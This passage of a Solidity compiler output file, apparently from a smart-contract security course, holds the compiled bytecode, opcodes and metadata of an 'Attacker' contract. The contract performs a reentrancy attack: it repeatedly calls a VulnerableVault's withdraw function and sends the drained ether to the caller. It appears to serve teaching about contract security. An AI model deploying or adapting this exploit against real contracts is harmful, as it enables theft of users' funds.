swap1\n      pop\n        /* \"#utility.yul\":986:1079   */\n      tag_53\n        /* \"#utility.yul\":1076:1077   */\n      0x00\n        /* \"#utility.yul\":1065:1074   */\n      dup4\n        /* \"#utility.yul\":1061:1078   */\n      add\n        /* \"#utility.yul\":1052:1058   */\n      dup5\n        /* \"#utility.yul\":986:1079   */\n      tag_35\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":820:1086   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1092:1261   */\n    tag_36:\n        /* \"#utility.yul\":1176:1187   */\n      0x00\n        /* \"#utility.yul\":1210:1216   */\n      dup3\n        /* \"#utility.yul\":1205:1208   */\n      dup3\n        /* \"#utility.yul\":1198:1217   */\n      mstore\n        /* \"#utility.yul\":1250:1254   */\n      0x20\n        /* \"#utility.yul\":1245:1248   */\n      dup3\n        /* \"#utility.yul\":1241:1255   */\n      add\n        /* \"#utility.yul\":1226:1255   */\n      swap1\n      pop\n        /* \"#utility.yul\":1092:1261   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1267:1427   */\n    tag_37:\n        /* \"#utility.yul\":1407:1419   */\n      0x6e65656420312045544800000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1403:1404   */\n      0x00\n        /* \"#utility.yul\":1395:1401   */\n      dup3\n        /* \"#utility.yul\":1391:1405   */\n      add\n        /* \"#utility.yul\":1384:1420   */\n      mstore\n        /* \"#utility.yul\":1267:1427   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1433:1799   */\n    tag_38:\n        /* \"#utility.yul\":1575:1578   */\n      0x00\n        /* \"#utility.yul\":1596:1663   */\n      tag_57\n        /* \"#utility.yul\":1660:1662   */\n      0x0a\n        /* \"#utility.yul\":1655:1658   */\n      dup4\n        /* \"#utility.yul\":1596:1663   */\n      tag_36\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":1589:1663   */\n      swap2\n      pop\n        /* \"#utility.yul\":1672:1765   */\n      tag_58\n        /* \"#utility.yul\":1761:1764   */\n      dup3\n        /* \"#utility.yul\":1672:1765   */\n      tag_37\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1790:1792   */\n      0x20\n        /* \"#utility.yul\":1785:1788   */\n      dup3\n        /* \"#utility.yul\":1781:1793   */\n      add\n        /* \"#utility.yul\":1774:1793   */\n      swap1\n      pop\n        /* \"#utility.yul\":1433:1799   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1805:2224   */\n    tag_21:\n        /* \"#utility.yul\":1971:1975   */\n      0x00\n        /* \"#utility.yul\":2009:2011   */\n      0x20\n        /* \"#utility.yul\":1998:2007   */\n      dup3\n        /* \"#utility.yul\":1994:2012   */\n      add\n        /* \"#utility.yul\":1986:2012   */\n      swap1\n      pop\n        /* \"#utility.yul\":2058:2067   */\n      dup2\n        /* \"#utility.yul\":2052:2056   */\n      dup2\n        /* \"#utility.yul\":2048:2068   */\n      sub\n        /* \"#utility.yul\":2044:2045   */\n      0x00\n        /* \"#utility.yul\":2033:2042   */\n      dup4\n        /* \"#utility.yul\":2029:2046   */\n      add\n        /* \"#utility.yul\":2022:2069   */\n      mstore\n        /* \"#utility.yul\":2086:2217   */\n      tag_60\n        /* \"#utility.yul\":2212:2216   */\n      dup2\n        /* \"#utility.yul\":2086:2217   */\n      tag_38\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":2078:2217   */\n      swap1\n      pop\n        /* \"#utility.yul\":1805:2224   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212203987c401c063020db31060012700ee192f44b824dbf8b2559ffbc01f99ce315c64736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b50604051610530380380610530833981810160405281019061003191906100d4565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6104248061010c5f395ff3fe60806040526004361061002c575f3560e01c80639e5faafc146100fa578063d4b8399214610104576100f6565b366100f657670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156100f4575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100dd575f5ffd5b505af11580156100ef573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b61010261012e565b005b34801561010f575f5ffd5b506101186102bf565b604051610125919061035d565b60405180910390f35b670de0b6b3a7640000341015610179576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610170906103d0565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101e7575f5ffd5b505af11580156101f9573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610263575f5ffd5b505af1158015610275573d5f5f3e3d5ffd5b505050503373ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f193505050501580156102bc573d5f5f3e3d5ffd5b50565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61032561032061031b846102e3565b610302565b6102e3565b9050919050565b5f6103368261030b565b9050919050565b5f6103478261032c565b9050919050565b6103578161033d565b82525050565b5f6020820190506103705f83018461034e565b92915050565b5f82825260208201905092915050565b7f6e656564203120455448000000000000000000000000000000000000000000005f82015250565b5f6103ba600a83610376565b91506103c582610386565b602082019050919050565b5f6020820190508181035f8301526103e7816103ae565b905091905056fea26469706673582212203987c401c063020db31060012700ee192f44b824dbf8b2559ffbc01f99ce315c64736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x530 CODESIZE SUB DUP1 PUSH2 0x530 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x424 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2C JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xFA JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x104 JUMPI PUSH2 0xF6 JUMP JUMPDEST CALLDATASIZE PUSH2 0xF6 JUMPI PUSH8 0xDE0B6B3A7640000 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0xF4 JUMPI PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xDD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xEF JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x102 PUSH2 0x12E JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x118 PUSH2 0x2BF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x125 SWAP2 SWAP1 PUSH2 0x35D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x179 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x170 SWAP1 PUSH2 0x3D0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1E7 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1F9 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x263 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x275 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x2BC JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x325 PUSH2 0x320 PUSH2 0x31B DUP5 PUSH2 0x2E3 JUMP JUMPDEST PUSH2 0x302 JUMP JUMPDEST PUSH2 0x2E3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x336 DUP3 PUSH2 0x30B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x347 DUP3 PUSH2 0x32C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x357 DUP2 PUSH2 0x33D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x370 PUSH0 DUP4 ADD DUP5 PUSH2 0x34E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6E65656420312045544800000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x3BA PUSH1 0xA DUP4 PUSH2 0x376 JUMP JUMPDEST SWAP2 POP PUSH2 0x3C5 DUP3 PUSH2 0x386 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x3E7 DUP2 PUSH2 0x3AE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODECOPY DUP8 0xC4 ADD 0xC0 PUSH4 0x20DB310 PUSH1 0x1 0x27 STOP RETURNCONTRACT 0x19 0x2F PREVRANDAO 0xB8 0x24 0xDB EXTCALL 0xB2 SSTORE SWAP16 EXTSTATICCALL 0xC0 0x1F SWAP10 0xCE BALANCE TLOAD PUSH5 0x736F6C6343 STOP ADDMOD 0x1E STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "212000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"target()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"target()": "d4b83992"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 75,
						"contract": "contracts/2.5-合约收款、转账与安全问题/VulnerableVault.sol:Attacker",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(VulnerableVault)72"
					}
				],
				"types": {
					"t_contract(VulnerableVault)72": {
						"encoding": "inplace",
						"label": "contract VulnerableVault",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}